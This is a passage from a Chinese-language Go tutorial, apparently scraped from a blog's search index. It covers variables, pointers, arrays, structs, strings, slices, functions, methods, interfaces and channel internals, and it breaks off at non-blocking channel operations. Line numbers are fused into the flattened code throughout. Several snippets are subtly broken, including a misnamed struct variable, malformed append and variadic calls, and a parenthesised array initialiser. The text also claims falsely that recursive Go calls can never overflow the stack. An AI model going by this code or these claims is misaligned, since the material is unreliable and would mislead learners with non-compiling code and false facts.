非常感谢各位人才能看到这里，原创不易，文章如果有帮助可以关注、点赞、分享或评论，这都是对我的莫大支持！","link":"/2022/11/15/%E3%80%90Gmail%E3%80%91%E5%9B%BD%E5%86%85%E6%80%8E%E4%B9%88%E6%B3%A8%E5%86%8CGmail%E9%82%AE%E7%AE%B1%EF%BC%9F/"},{"title":"Go语言超全详解（入门级）","text":"# Go 语言超全详解（入门级） # 文章目录 1. Go 语言的出现 2. go 版本的 hello world 3. 数据类型 3.0 定义变量 3.0.1 如果变量没有初始化 3.0.2 如果变量没有指定类型 3.0.3 := 符号 3.0.4 多变量声明 3.0.5 匿名变量 3.0.6 变量作用域 3.1 基本类型 3.2 指针 3.2.1 指针声明和初始化 3.2.2 空指针 3.3 数组 3.3.1 声明数组 3.3.2 初始化数组 3.3.3 go 中的数组名意义 3.3.4 数组指针 3.4 结构体 3.4.1 声明结构体 3.4.2 访问结构体成员 3.4.3 结构体指针 3.5 字符串 3.5.1 字符串定义和初始化 3.5.2 字符串 UTF8 编码 3.5.3 字符串的强制类型转换 3.6 slice 3.6.1 slice 定义 3.6.2 添加元素 3.6.3 删除元素 3.7 函数 3.7.1 函数分类 3.7.2 函数声明和定义 3.7.3 函数传参 3.7.4 函数返回值 3.7.5 递归调用 3.8 方法 3.9 接口 3.9.1 什么是接口 3.9.2 结构体类型 3.9.3 具体类型向接口类型赋值 3.9.4 获取接口类型数据的具体类型信息 3.10 channel 3.10.1 相关结构体定义 3.10.2 阻塞式读写 channel 操作 3.10.3 非阻塞式读写 channel 操作 3.11 map 3.11.1 插入数据 3.11.2 删除数据 3.11.3 查找数据 3.11.4 扩容 4. 常用语句及关键字 4.1 条件语句 4.2 循环语句 4.2.1 循环处理语句 4.2.1 循环控制语句 4.3 关键字 # 1. Go 语言的出现 在具体学习 go 语言的基础语法之前，我们来了解一下 go 语言出现的时机及其特点。 Go 语言最初由 Google 公司的 Robert Griesemer、Ken Thompson 和 Rob Pike 三个大牛于 2007 年开始设计发明，他们最终的目标是设计一种适应网络和多核时代的 C 语言。所以 Go 语言很多时候被描述为 “类 C 语言”，或者是 “21 世纪的 C 语言”，当然从各种角度看，Go 语言确实是从 C 语言继承了相似的表达式语法、控制流结构、基础数据类型、调用参数传值、指针等诸多编程思想。但是 Go 语言更是对 C 语言最彻底的一次扬弃，它舍弃了 C 语言中灵活但是危险的指针运算，还重新设计了 C 语言中部分不太合理运算符的优先级，并在很多细微的地方都做了必要的打磨和改变。 # 2. go 版本的 hello world 在这一部分我们只是使用 “hello world” 的程序来向大家介绍一下 go 语言的所编写的程序的基本组成。 1234567package mainimport &quot;fmt&quot;func main() { // 终端输出hello world fmt.Println(&quot;Hello world!&quot;)}123456 和 C 语言相似，go 语言的基本组成有： 包声明，编写源文件时，必须在非注释的第一行指明这个文件属于哪个包，如 package main 。 引入包，其实就是告诉 Go 编译器这个程序需要使用的包，如 import &quot;fmt&quot; 其实就是引入了 fmt 包。 函数，和 c 语言相同，即是一个可以实现某一个功能的函数体，每一个可执行程序中必须拥有一个 main 函数。 变量，Go 语言变量名由字母、数字、下划线组成，其中首个字符不能为数字。 语句 / 表达式，在 Go 程序中，一行代表一个语句结束。每个语句不需要像 C 家族中的其它语言一样以分号；结尾，因为这些工作都将由 Go 编译器自动完成。 注释，和 c 语言中的注释方式相同，可以在任何地方使用以 // 开头的单行注释。以 /* 开头，并以 */ 结尾来进行多行注释，且不可以嵌套使用，多行注释一般用于包的文档描述或注释成块的代码片段。 需要注意的是：标识符是用来命名变量、类型等程序实体。一个标识符实际上就是一个或是多个字母和数字、下划线_组成的序列，但是第一个字符必须是字母或下划线而不能是数字。 当标识符（包括常量、变量、类型、函数名、结构字段等等）以一个大写字母开头，如：Group1，那么使用这种形式的标识符的对象就可以被外部包的代码所使用（客户端程序需要先导入这个包），这被称为导出（像面向对象语言中的 public）； 标识符如果以小写字母开头，则对包外是不可见的，但是他们在整个包的内部是可见并且可用的（像面向对象语言中的 protected）。 # 3. 数据类型 在 Go 编程语言中，数据类型用于声明函数和变量。 数据类型的出现是为了把数据分成所需内存大小不同的数据，编程的时候需要用大数据的时候才需要申请大内存，就可以充分利用内存。具体分类如下： 类型 详解 布尔型 布尔型的值只可以是常量 true 或者 false。 数字类型 整型 int 和浮点型 float。Go 语言支持整型和浮点型数字，并且支持复数，其中位的运算采用补码。 字符串类型 字符串就是一串固定长度的字符连接起来的字符序列。Go 的字符串是由单个字节连接起来的。Go 语言的字符串的字节使用 UTF-8 编码标识 Unicode 文本。 派生类型 (a) 指针类型（Pointer）(b) 数组类型 © 结构化类型 (struct)(d) Channel 类型 (e) 函数类型 (f) 切片类型 (g) 接口类型（interface）(h) Map 类型 # 3.0 定义变量 声明变量的一般形式是使用 var 关键字，具体格式为： var identifier typename 。如下的代码中我们定义了一个类型为 int 的变量。 1234567package mainimport &quot;fmt&quot;func main() { var a int = 27 fmt.Println(a);} 123456 # 3.0.1 如果变量没有初始化 在 go 语言中定义了一个变量，指定变量类型，如果没有初始化，则变量默认为零值。零值就是变量没有做初始化时系统默认设置的值。 类型 零值 数值类型 0 布尔类型 false 字符串 “”（空字符串） # 3.0.2 如果变量没有指定类型 在 go 语言中如果没有指定变量类型，可以通过变量的初始值来判断变量类型。如下代码 1234567package mainimport &quot;fmt&quot;func main() { var d = true fmt.Println(d)}123456 # 3.0.3 := 符号 当我们定义一个变量后又使用该符号初始化变量，就会产生编译错误，因为该符号其实是一个声明语句。 使用格式： typename := value 也就是说 intVal := 1 相等于： 123var intVal int intVal =1 12 # 3.0.4 多变量声明 可以同时声明多个类型相同的变量（非全局变量），如下图所示： 1234var x, y intvar c, d int = 1, 2g, h := 123, &quot;hello&quot;123 关于全局变量的声明如下： var ( vname1 v_type1 vname2 v_type2 ) 具体举例如下： 12345var ( a int b bool)1234 # 3.0.5 匿名变量 匿名变量的特点是一个下画线 _ ，这本身就是一个特殊的标识符，被称为空白标识符。它可以像其他标识符那样用于变量的声明或赋值（任何类型都可以赋值给它），但任何赋给这个标识符的值都将被抛弃，因此这些值不能在后续的代码中使用，也不可以使用这个标识符作为变量对其它变量进行赋值或运算。 使用匿名变量时，只需要在变量声明的地方使用下画线替换即可。 示例代码如下： 123456789 func GetData() (int, int) { return 10, 20 } func main(){ a, _ := GetData() _, b := GetData() fmt.Println(a, b) }12345678 需要注意的是匿名变量不占用内存空间，不会分配内存。匿名变量与匿名变量之间也不会因为多次声明而无法使用。 # 3.0.6 变量作用域 作用域指的是已声明的标识符所表示的常量、类型、函数或者包在源代码中的作用范围，在此我们主要看一下 go 中变量的作用域，根据变量定义位置的不同，可以分为一下三个类型： 函数内定义的变量为局部变量，这种局部变量的作用域只在函数体内，函数的参数和返回值变量都属于局部变量。这种变量在存在于函数被调用时，销毁于函数调用结束后。 函数外定义的变量为全局变量，全局变量只需要在一个源文件中定义，就可以在所有源文件中使用，甚至可以使用 import 引入外部包来使用。全局变量声明必须以 var 关键字开头，如果想要在外部包中使用全局变量的首字母必须大写。 函数定义中的变量成为形式参数，定义函数时函数名后面括号中的变量叫做形式参数（简称形参）。形式参数只在函数调用时才会生效，函数调用结束后就会被销毁，在函数未被调用时，函数的形参并不占用实际的存储单元，也没有实际值。形式参数会作为函数的局部变量来使用。 # 3.1 基本类型 类型 描述 uint8 / uint16 / uint32 / uint64 无符号 8 / 16 / 32 / 64 位整型 int8 / int16 / int32 / int64 有符号 8 / 16 / 32 / 64 位整型 float32 / float64 IEEE-754 32 / 64 位浮点型数 complex64 / complex128 32 / 64 位实数和虚数 byte 类似 uint8 rune 类似 int32 uintptr 无符号整型，用于存放一个指针 以上就是 go 语言基本的数据类型，有了数据类型，我们就可以使用这些类型来定义变量，Go 语言变量名由字母、数字、下划线组成，其中首个字符不能为数字。 # 3.2 指针 与 C 相同，Go 语言让程序员决定何时使用指针。变量其实是一种使用方便的占位符，用于引用计算机内存地址。Go 语言中的的取地址符是 &amp; ，放到一个变量前使用就会返回相应变量的内存地址。 指针变量其实就是用于存放某一个对象的内存地址。 # 3.2.1 指针声明和初始化 和基础类型数据相同，在使用指针变量之前我们首先需要申明指针，声明格式如下： var var_name *var-type ，其中的 var-type 为指针类型，var_name 为指针变量名，* 号用于指定变量是作为一个指针。 代码举例如下： 123var ip *int /* 指向整型*/var fp *float32 /* 指向浮点型 */12 指针的初始化就是取出相对应的变量地址对指针进行赋值，具体如下： 12345 var a int= 20 /* 声明实际变量 */ var ip *int /* 声明指针变量 */ ip = &amp;a /* 指针变量的存储地址 */1234 # 3.2.2 空指针 当一个指针被定义后没有分配到任何变量时，它的值为 nil，也称为空指针。它概念上和其它语言的 null、NULL 一样，都指代零值或空值。 # 3.3 数组 和 c 语言相同，Go 语言也提供了数组类型的数据结构，数组是具有相同唯一类型的一组已编号且长度固定的数据项序列，这种类型可以是任意的原始类型例如整型、字符串或者自定义类型。 # 3.3.1 声明数组 Go 语言数组声明需要指定元素类型及元素个数，语法格式如下： 1var variable_name [SIZE] variable_type 以上就可以定一个一维数组，我们举例代码如下： 12var balance [10] float321 # 3.3.2 初始化数组 数组的初始化方式有不止一种方式，我们列举如下： 直接进行初始化： var balance = [5]float32{1000.0, 2.0, 3.4, 7.0, 50.0} 通过字面量在声明数组的同时快速初始化数组： balance := [5]float32{1000.0, 2.0, 3.4, 7.0, 50.0} 数组长度不确定，编译器通过元素个数自行推断数组长度，在 [ ] 中填入 ... ，举例如下： var balance = [...]float32{1000.0, 2.0, 3.4, 7.0, 50.0} 和 balance := [...]float32{1000.0, 2.0, 3.4, 7.0, 50.0} 数组长度确定，指定下标进行部分初始化： balanced := [5]float32(1:2.0, 3:7.0) 注意： 初始化数组中 {} 中的元素个数不能大于 [] 中的数字。 如果忽略 [] 中的数字不设置数组大小，Go 语言会根据元素的个数来设置数组的大小。 # 3.3.3 go 中的数组名意义 在 c 语言中我们知道数组名在本质上是数组中第一个元素的地址，而在 go 语言中，数组名仅仅表示整个数组，是一个完整的值，一个数组变量即是表示整个数组。 所以在 go 中一个数组变量被赋值或者被传递的时候实际上就会复制整个数组。如果数组比较大的话，这种复制往往会占有很大的开销。所以为了避免这种开销，往往需要传递一个指向数组的指针，这个数组指针并不是数组。关于数组指针具体在指针的部分深入的了解。 # 3.3.4 数组指针 通过数组和指针的知识我们就可以定义一个数组指针，代码如下： 123var a = [...]int{1, 2, 3} // a 是一个数组var b = &amp;a // b 是指向数组的指针12 数组指针除了可以防止数组作为参数传递的时候浪费空间，还可以利用其和 for range 来遍历数组，具体代码如下： 1234for i, v := range b { // 通过数组指针迭代数组的元素 fmt.Println(i, v)}123 具体关于 go 语言的循环语句我们在后文中再进行详细介绍。 # 3.4 结构体 通过上述数组的学习，我们就可以直接定义多个同类型的变量，但这往往也是一种限制，只能存储同一种类型的数据，而我们在结构体中就可以定义多个不同的数据类型。 # 3.4.1 声明结构体 在声明结构体之前我们首先需要定义一个结构体类型，这需要使用 type 和 struct，type 用于设定结构体的名称，struct 用于定义一个新的数据类型。具体结构如下： 1234567type struct_variable_type struct { member definition member definition ... member definition}123456 定义好了结构体类型，我们就可以使用该结构体声明这样一个结构体变量，语法如下： 1234variable_name := structure_variable_type {value1, value2...valuen}variable_name := structure_variable_type { key1: value1, key2: value2..., keyn: valuen}123 # 3.4.2 访问结构体成员 如果要访问结构体成员，需要使用点号 . 操作符，格式为： 结构体变量名.成员名 。举例代码如下： 123456789101112131415package mainimport &quot;fmt&quot;type Books struct { title string author string}func main() { var book1 Books Book1.title = &quot;Go 语言入门&quot; Book1.author = &quot;mars.hao&quot; }1234567891011121314 # 3.4.3 结构体指针 关于结构体指针的定义和申明同样可以套用前文中讲到的指针的相关定义，从而使用一个指针变量存放一个结构体变量的地址。 定义一个结构体变量的语法： var struct_pointer *Books 。 这种指针变量的初始化和上文指针部分的初始化方式相同 struct_pointer = &amp;Book1 ，但是和 c 语言中有所不同，使用结构体指针访问结构体成员仍然使用 . 操作符。格式如下： struct_pointer.title # 3.5 字符串 一个字符串是一个不可改变的字节序列，字符串通常是用来包含人类可读的文本数据。和数组不同的是，字符串的元素不可修改，是一个只读的字节数组。每个字符串的长度虽然也是固定的，但是字符串的长度并不是字符串类型的一部分。 # 3.5.1 字符串定义和初始化 Go 语言字符串的底层结构在 reflect.StringHeader 中定义，具体如下： 12345type StringHeader struct { Data uintptr Len int}1234 也就是说字符串结构由两个信息组成：第一个是字符串指向的底层字节数组，第二个是字符串的字节的长度。 字符串其实是一个结构体，因此字符串的赋值操作也就是 reflect.StringHeader 结构体的复制过程，并不会涉及底层字节数组的复制，所以我们也可以将字符串数组看作一个结构体数组。 字符串和数组类似，内置的 len 函数返回字符串的长度。 # 3.5.2 字符串 UTF8 编码 根据 Go 语言规范，Go 语言的源文件都是采用 UTF8 编码。因此，Go 源文件中出现的字符串面值常量一般也是 UTF8 编码的（对于转义字符，则没有这个限制）。提到 Go 字符串时，我们一般都会假设字符串对应的是一个合法的 UTF8 编码的字符序列。 Go 语言的字符串中可以存放任意的二进制字节序列，而且即使是 UTF8 字符序列也可能会遇到坏的编码。如果遇到一个错误的 UTF8 编码输入，将生成一个特别的 Unicode 字符‘\\uFFFD’，这个字符在不同的软件中的显示效果可能不太一样，在印刷中这个符号通常是一个黑色六角形或钻石形状，里面包含一个白色的问号‘ ’。 下面的字符串中，我们故意损坏了第一字符的第二和第三字节，因此第一字符将会打印为 “”，第二和第三字节则被忽略；后面的 “abc” 依然可以正常解码打印（错误编码不会向后扩散是 UTF8 编码的优秀特性之一）。代码如下： 12fmt.Println(&quot;\\xe4\\x00\\x00\\xe7\\x95\\x8cabc&quot;) // 界abc1 不过在 for range 迭代这个含有损坏的 UTF8 字符串时，第一字符的第二和第三字节依然会被单独迭代到，不过此时迭代的值是损坏后的 0： 12345678// 0 65533 // \\uFFFD, 对应 // 1 0 // 空字符// 2 0 // 空字符// 3 30028 // 界// 6 97 // a// 7 98 // b// 8 99 // c1234567 # 3.5.3 字符串的强制类型转换 在上文中我们知道源代码往往会采用 UTF8 编码，如果不想解码 UTF8 字符串，想直接遍历原始的字节码： 可以将字符串强制转为 [] byte 字节序列后再行遍历（这里的转换一般不会产生运行时开销）： 采用传统的下标方式遍历字符串的字节数组 除此以外，字符串相关的强制类型转换主要涉及到 [] byte 和 [] rune 两种类型。每个转换都可能隐含重新分配内存的代价，最坏的情况下它们的运算时间复杂度都是 O (n)。 不过字符串和 [] rune 的转换要更为特殊一些，因为一般这种强制类型转换要求两个类型的底层内存结构要尽量一致，显然它们底层对应的 [] byte 和 [] int32 类型是完全不同的内部布局，因此这种转换可能隐含重新分配内存的操作。 # 3.6 slice 简单地说，切片就是一种简化版的动态数组。因为动态数组的长度不固定，切片的长度自然也就不能是类型的组成部分了。数组虽然有适用它们的地方，但是数组的类型和操作都不够灵活，而切片则使用得相当广泛。 切片高效操作的要点是要降低内存分配的次数，尽量保证 append 操作（在后续的插入和删除操作中都涉及到这个函数）不会超出 cap 的容量，降低触发内存分配的次数和每次分配内存大小。 # 3.6.1 slice 定义 我们先看看切片的结构定义，reflect.SliceHeader： 123456type SliceHeader struct { Data uintptr // 指向底层的的数组指针 Len int // 切片长度 Cap int // 切片最大长度}12345 和数组一样，内置的 len 函数返回切片中有效元素的长度，内置的 cap 函数返回切片容量大小，容量必须大于或等于切片的长度。 切片可以和 nil 进行比较，只有当切片底层数据指针为空时切片本身为 nil，这时候切片的长度和容量信息将是无效的。如果有切片的底层数据指针为空，但是长度和容量不为 0 的情况，那么说明切片本身已经被损坏了 只要是切片的底层数据指针、长度和容量没有发生变化的话，对切片的遍历、元素的读取和修改都和数组是一样的。在对切片本身赋值或参数传递时，和数组指针的操作方式类似，只是复制切片头信息（reflect.SliceHeader），并不会复制底层的数据。对于类型，和数组的最大不同是，切片的类型和长度信息无关，只要是相同类型元素构成的切片均对应相同的切片类型。 当我们想定义声明一个切片时可以如下： 在对切片本身赋值或参数传递时，和数组指针的操作方式类似，只是复制切片头信息・（reflect.SliceHeader），并不会复制底层的数据。对于类型，和数组的最大不同是，切片的类型和长度信息无关，只要是相同类型元素构成的切片均对应相同的切片类型。 # 3.6.2 添加元素 append() ：内置的泛型函数，可以向切片中增加元素。 在切片尾部追加 N 个元素 12345var a []inta = append(a, 1) // 追加1个元素a = append(a, 1, 2, 3) // 追加多个元素, 手写解包方式a = append(a, []int{1,2,3}...) // 追加一个切片, 切片需要解包1234 注意：尾部添加在容量不足的条件下需要重新分配内存，可能导致巨大的内存分配和复制数据代价。即使容量足够，依然需要用 append 函数的返回值来更新切片本身，因为新切片的长度已经发生了变化。 在切片开头位置添加元素 1234var a = []int{1,2,3}a = append([]int{0}, a...) // 在开头位置添加1个元素a = append([]int{-3,-2,-1}, a...) // 在开头添加1个切片123 注意：在开头一般都会导致内存的重新分配，而且会导致已有的元素全部复制 1 次。因此，从切片的开头添加元素的性能一般要比从尾部追加元素的性能差很多。 append 链式操作 1234var a []inta = append(a[:i], append([]int{x}, a[i:]...)...) // 在第i个位置插入xa = append(a[:i], append([]int{1,2,3}, a[i:]...)...) // 在第i个位置插入切片123 每个添加操作中的第二个 append 调用都会创建一个临时切片，并将 a [i:] 的内容复制到新创建的切片中，然后将临时创建的切片再追加到 a [:i]。 append 和 copy 组合 1234a = append(a, 0) // 切片扩展1个空间copy(a[i+1:], a[i:]) // a[i:]向后移动1个位置a[i] = x // 设置新添加的元素123 第三个操作中会创建一个临时对象，我们可以借用 copy 函数避免这个操作，这种方式操作语句虽然冗长了一点，但是相比前面的方法，可以减少中间创建的临时切片。 # 3.6.3 删除元素 根据要删除元素的位置有三种情况： 从开头位置删除； 直接移动数据指针，代码如下： 1234a = []int{1, 2, 3, ...}a = a[1:] // 删除开头1个元素a = a[N:] // 删除开头N个元素123 将后面的数据向开头移动，使用 append 原地完成（所谓原地完成是指在原有的切片数据对应的内存区间内完成，不会导致内存空间结构的变化） 1234a = []int{1, 2, 3, ...}a = append(a[:0], a[1:]...) // 删除开头1个元素a = append(a[:0], a[N:]...) // 删除开头N个元素123 使用 copy 将后续数据向前移动，代码如下： 1234a = []int{1, 2, 3}a = a[:copy(a, a[1:])] // 删除开头1个元素a = a[:copy(a, a[N:])] // 删除开头N个元素123 从中间位置删除； 对于删除中间的元素，需要对剩余的元素进行一次整体挪动，同样可以用 append 或 copy 原地完成： append 删除操作如下： 1234a = []int{1, 2, 3, ...}a = append(a[:i], a[i+1], ...)a = append(a[:i], a[i+N:], ...)123 copy 删除操作如下： 1234a = []int{1, 2, 3}a = a[:copy(a[:i], a[i+1:])] // 删除中间1个元素a = a[:copy(a[:i], a[i+N:])] // 删除中间N个元素123 从尾部删除。 代码如下所示： 12345a = []int{1, 2, 3, ...}a = a[:len(a)-1] // 删除尾部1个元素a = a[:len(a)-N] // 删除尾部N个元素1234 删除切片尾部的元素是最快的 # 3.7 函数 为完成某一功能的程序指令 (语句) 的集合，称为函数。 # 3.7.1 函数分类 在 Go 语言中，函数是第一类对象，我们可以将函数保持到变量中。函数主要有具名和匿名之分，包级函数一般都是具名函数，具名函数是匿名函数的一种特例，当匿名函数引用了外部作用域中的变量时就成了闭包函数，闭包函数是函数式编程语言的核心。 举例代码如下： 具名函数：就和 c 语言中的普通函数意义相同，具有函数名、返回值以及函数参数的函数。 1234func Add(a, b int) int { return a+b}123 匿名函数：指不需要定义函数名的一种函数实现方式，它由一个不带函数名的函数声明和函数体组成。 1234var Add = func(a, b int) int { return a+b}123 解释几个名词如下： 闭包函数：返回为函数对象，不仅仅是一个函数对象，在该函数外还包裹了一层作用域，这使得，该函数无论在何处调用，优先使用自己外层包裹的作用域。 一级对象：支持闭包的多数语言都将函数作为第一级对象，就是说函数可以存储到变量中作为参数传递给其他函数，最重要的是能够被函数动态创建和返回。 包：go 的每一个文件都是属于一个包的，也就是说 go 是以包的形式来管理文件和项目目录结构的。 # 3.7.2 函数声明和定义 Go 语言函数定义格式如下： 1234func fuction_name([parameter list])[return types]{ 函数体}123 解析 func 函数由 func 开始声明 function_name 函数名称 parameter list 参数列表 return_types 返回类型 函数体 函数定义的代码集合 # 3.7.3 函数传参 Go 语言中的函数可以有多个参数和多个返回值，参数和返回值都是以传值的方式和被调用者交换数据。在语法上，函数还支持可变数量的参数，可变数量的参数必须是最后出现的参数，可变数量的参数其实是一个切片类型的参数。 当可变参数是一个空接口类型时，调用者是否解包可变参数会导致不同的结果，我们解释一下解包的含义，代码如下： 12345678910func main(){ var a = []int{1, 2, 3} Print(a...) // 解包 Print(a) // 未解包}func Print(a ...int{}) { fmt.Println(a...)}123456789 以上当传入参数为 a... 时即是对切片 a 进行了解包，此时其实相当于直接调用 Print(1,2,3) 。当传入参数直接为 a 时等价于直接调用 Print([]int{}{1,2,3}) # 3.7.4 函数返回值 不仅函数的参数可以有名字，也可以给函数的返回值命名。 举例代码如下： 12345func Find(m map[int]int, key int)(value int, ok bool) { value,ok = m[key] return}1234 如果返回值命名了，可以通过名字来修改返回值，也可以通过 defer 语句在 return 语句之后修改返回值，举例代码如下： 1234567891011func mian() { for i := 0 ; i&lt;3; i++ { defer func() { println(i) } }}// 该函数最终的输出为：// 3// 3// 312345678910 以上代码中如果没有 defer 其实返回值就是 0,1,2 ，但 defer 语句会在函数 return 之后才会执行，也就是或只有以上函数在执行结束 return 之后才会执行 defer 语句，而该函数 return 时的 i 值将会达到 3，所以最终的 defer 语句执行 printlin 的输出都是 3。 defer 语句延迟执行的其实是一个匿名函数，因为这个匿名函数捕获了外部函数的局部变量 v，这种函数我们一般叫闭包。闭包对捕获的外部变量并不是传值方式访问，而是以引用的方式访问。 这种方式往往会带来一些问题，修复方法为在每一轮迭代中都为 defer 函数提供一个独有的变量，修改代码如下： 12345678910111213141516func main() { for i := 0; i &lt; 3; i++ { i := i // 定义一个循环体内局部变量i defer func(){ println(i) } () }}func main() { for i := 0; i &lt; 3; i++ { // 通过函数传入i // defer 语句会马上对调用参数求值 // 不再捕获，而是直接传值 defer func(i int){ println(i) } (i) }}123456789101112131415 # 3.7.5 递归调用 Go 语言中，函数还可以直接或间接地调用自己，也就是支持递归调用。Go 语言函数的递归调用深度逻辑上没有限制，函数调用的栈是不会出现溢出错误的，因为 Go 语言运行时会根据需要动态地调整函数栈的大小。这部分的知识将会涉及 goroutint 和动态栈的相关知识，我们将会在之后的博文中向大家解释。 它的语法和 c 很相似，格式如下： 12345678func recursion() { recursion() /* 函数调用自身 */}func main() { recursion()}1234567 # 3.8 方法 方法一般是面向对象编程 (OOP) 的一个特性，在 C++ 语言中方法对应一个类对象的成员函数，是关联到具体对象上的虚表中的。但是 Go 语言的方法却是关联到类型的，这样可以在编译阶段完成方法的静态绑定。一个面向对象的程序会用方法来表达其属性对应的操作，这样使用这个对象的用户就不需要直接去操作对象，而是借助方法来做这些事情。 实现 C 语言中的一组函数如下： 1234567891011121314151617181920// 文件对象type File struct { fd int}// 打开文件func OpenFile(name string) (f *File, err error) { // ...}// 关闭文件func CloseFile(f *File) error { // ...}// 读文件数据func ReadFile(f *File, offset int64, data []byte) int { // ...}12345678910111213141516171819 以上的三个函数都是普通的函数，需要占用包级空间中的名字资源。不过 CloseFile 和 ReadFile 函数只是针对 File 类型对象的操作，这时候我们更希望这类函数和操作对象的类型紧密绑定在一起。 所以在 go 语言中我们修改如下： 12345678910// 关闭文件func (f *File) CloseFile() error { // ...}// 读文件数据func (f *File) ReadFile(offset int64, data []byte) int { // ...}123456789 将 CloseFile 和 ReadFile 函数的第一个参数移动到函数名的开头，这两个函数就成了 File 类型独有的方法了（而不是 File 对象方法） 从代码角度看虽然只是一个小的改动，但是从编程哲学角度来看，Go 语言已经是进入面向对象语言的行列了。我们可以给任何自定义类型添加一个或多个方法。每种类型对应的方法必须和类型的定义在同一个包中，因此是无法给 int 这类内置类型添加方法的（因为方法的定义和类型的定义不在一个包中）。对于给定的类型，每个方法的名字必须是唯一的，同时方法和函数一样也不支持重载。 # 3.9 接口 # 3.9.1 什么是接口 Go 语言提供了另外一种数据类型即接口，它把所有的具有共性的方法定义在一起，任何其他类型只要实现了这些方法就是实现了这个接口。 Go 的接口类型是对其它类型行为的抽象和概括；因为接口类型不会和特定的实现细节绑定在一起，通过这种抽象的方式我们可以让对象更加灵活和更具有适应能力。很多面向对象的语言都有相似的接口概念，但 Go 语言中接口类型的独特之处在于它是满足隐式实现的鸭子类型。 所谓鸭子类型说的是：只要走起路来像鸭子、叫起来也像鸭子，那么就可以把它当作鸭子。Go 语言中的面向对象就是如此，如果一个对象只要看起来像是某种接口类型的实现，那么它就可以作为该接口类型使用。 就比如说在 c 语言中，使用 printf 在终端输出的时候只能输出有限类型的几个变量，而在 go 中可以使用 fmt.Printf，实际上是 fmt.Fprintf 向任意自定义的输出流对象打印，甚至可以打印到网络甚至是压缩文件，同时打印的数据不限于语言内置的基础类型，任意隐士满足 fmt.Stringer 接口的对象都可以打印，不满足 fmt.Stringer 接口的依然可以通过反射的技术打印。 # 3.9.2 结构体类型 interface 实际上就是一个结构体，包含两个成员。其中一个成员是指向具体数据的指针，另一个成员中包含了类型信息。空接口和带方法的接口略有不同，下面分别是空接口的数据结构： 123456struct Eface{ Type* type; void* data;};12345 其中的 Type 指的是： 123456789101112131415struct Type{ uintptr size; uint32 hash; uint8 _unused; uint8 align; uint8 fieldAlign; uint8 kind; Alg *alg; void *gc; String *string; UncommonType *x; Type *ptrto;};1234567891011121314 和带方法的接口使用的数据结构： 123456struct Iface{ Itab* tab; void* data;};12345 其中的 Iface 指的是： 12345678910struct Itab{ InterfaceType* inter; Type* type; Itab* link; int32 bad; int32 unused; void (*fun[])(void); // 方法表};123456789 # 3.9.3 具体类型向接口类型赋值 将一个具体类型数据赋值给 interface 这样的抽象类型，需要进行类型转换。这个转换过程中涉及哪些操作呢？ 如果转换为空接口，返回一个 Eface，将 Eface 中的 data 指针指向原型数据，type 指针会指向数据的 Type 结构体。 如果将其转化为带方法的 interface，需要进行一次检测，该类型必须实现 interface 中声明的所有方法才可以进行转换，这个检测将会在编译过程中进行。检测过程具体实现式通过比较具体类型的方法表和接口类型的方法表来进行的。 具体类型方法表：Type 的 UncommonType 中有一个方法表，某个具体类型实现的所有方法都会被收集到这张表中。 接口类型方法表：Iface 的 Itab 的 InterfaceType 中也有一张方法表，这张方法表中是接口所声明的方法。Iface 中的 Itab 的 func 域也是一张方法表，这张表中的每一项就是一个函数指针，也就是只有实现没有声明。 这两处方法表都是排序过的，只需要一遍顺序扫描进行比较，应该可以知道 Type 中否实现了接口中声明的所有方法。最后还会将 Type 方法表中的函数指针，拷贝到 Itab 的 fun 字段中。Iface 中的 Itab 的 func 域也是一张方法表，这张表中的每一项就是一个函数指针，也就是只有实现没有声明。 # 3.9.4 获取接口类型数据的具体类型信息 接口类型转换为具体类型 (也就是反射，reflect)，也涉及到了类型转换。reflect 包中的 TypeOf 和 ValueOf 函数来得到接口变量的 Type 和 Value。 # 3.10 channel # 3.10.1 相关结构体定义 go 中的 channel 是可以被存储在变量中，可以作为参数传递给函数，也可以作为函数返回值返回，我们先来看一下 channel 的结构体定义： 123456789101112131415struct Hchan{ uintgo qcount; // 队列q中的总数据数量 uintgo dataqsize; // 环形队列q的数据大小 uint16 elemsize; // 当前队列的使用量 bool closed; uint8 elemalign; Alg* elemalg; // interface for element type uintgo sendx; // 发送index uintgo recvx; // 接收index WaitQ recvq; // 因recv而阻塞的等待队列 WaitQ sendq; // 因send而阻塞的等待队列 Lock;};1234567891011121314 Hchan 结构体中的核心部分是存放 channel 数据的环形队列，相关数据的作用已经在其后做出了备注。在该结构体中没有存放数据的域，如果是带缓冲区的 chan，则缓冲区数据实际上是紧接着 Hchan 结构体中分配的。 另一个重要部分就是 recvq 和 sendq 两个链表，一个是因读这个通道而导致阻塞的 goroutine，另一个是因为写这个通道而阻塞的 goroutine。如果一个 goroutine 阻塞于 channel 了，那么它就被挂在 recvq 或 sendq 中。WaitQ 是链表的定义，包含一个头结点和一个尾结点，该链表中中存放的成员是一个 sudoG 结构体变量，具体定义如下： 123456789struct SudoG{ G* g; // g and selgen constitute uint32 selgen; // a weak pointer to g SudoG* link; int64 releasetime; byte* elem; // data element};12345678 该结构体中最主要的是 g 和 elem。elem 用于存储 goroutine 的数据。读通道时，数据会从 Hchan 的队列中拷贝到 SudoG 的 elem 域。写通道时，数据则是由 SudoG 的 elem 域拷贝到 Hchan 的队列中。 Hchan 结构如下： # 3.10.2 阻塞式读写 channel 操作 写操作代码如下，其中的 c 就是 channel，v 指的是数据： 12c &lt;- v1 事实上基本的阻塞模式写 channel 操作在底层运行时库中对应的是一个 runtime.chansend 函数。具体如下： 1void runtime·chansend(ChanType *t, Hchan *c, byte *ep, bool *pres, void *pc) 其中的 ep 指的是变量 v 的地址，这里的传值约定是调用者负责分配好 ep 的空间，仅需要简单的取变量地址就好了，pres 是在 select 中的通道操作中使用的。 阻塞模式读操作的核心函数有两种包装如下： 1chanrecv(c *hchan, ep unsafe.Pointer, block bool) (selected, received bool) 以及 1chanrecv(c *hchan, ep unsafe.Pointer, block bool) (selected) 这两种的区别主要在于返回值是否会返回一个 bool 类型值，该值只是用于判断 channel 是否能读取出数据。 读写操作的以上阻塞的过程类似，故而不再做出说明，我们补充三个细节： 以上我们都强调是阻塞式的读写操作，其实相对应的也有非阻塞的读写操作，使用过 select-case 来进行调用的。 空通道，指的是将一个 channel 赋值为 nil，或者调用后不适用 make 进行初始化。读写空通道是永远阻塞的。 关闭的通道，永远不会阻塞，会返回一个通道数据类型的零值。首先将 closed 置为 1，第二步收集读等待队列 recvq 的所有 sg，每个 sg 的 elem 都设为类型零值，第三步收集写等待队列 sendq 的所有 sg，每个 sg 的 elem 都设为 nil，最后唤醒所有收集的 sg。 # 3.10.3 非阻塞式读写 channel 操作 